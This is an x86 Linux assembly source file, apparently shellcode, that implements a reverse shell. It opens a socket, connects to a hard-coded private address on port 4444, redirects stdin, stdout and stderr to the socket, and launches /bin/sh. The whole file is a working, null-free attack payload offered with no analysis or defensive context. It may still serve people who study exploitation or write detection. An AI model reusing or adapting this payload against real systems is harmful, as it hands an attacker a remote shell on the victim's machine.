;
;
;
;
global _start

section .text

_start:
	xor	ebx, ebx
	mul	ebx

	;listenfd=socket(AF_INET, SOCK_STREAM, 0)
	mov	al, 0x66
	inc	ebx
	push	edx
	push	ebx
	push	0x2
	mov	ecx, esp
	int	0x80

	;connect(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))
	pop	ebx
	push	0x6801a8c0
	push	word 0x5c11
	push	bx
	mov	ecx, esp
	push	0x10
	push	ecx
	push	eax
	mov	ecx, esp
	mov	al, 0x66
	inc	ebx
	int	0x80

	;dup2(connfd, 2); dup2(connfd, 1); dup2(connfd, 0);
	xchg	ebx, eax
	xor	ecx, ecx
	mov	cl,0x3
dupfd:
	dec	cl
	mov	al, 0x3f
	int	0x80
	jne	dupfd

	;execve("/bin/sh", NULL, NULL)
	xor	eax, eax
	push	edx
	push	0x68732f6e
	push	0x69622f2f
	mov	ebx, esp
	push	edx
	push	ebx
	mov	ecx, esp
	push	edx
	mov	edx, esp
	mov	al, 0xb
	int	0x80
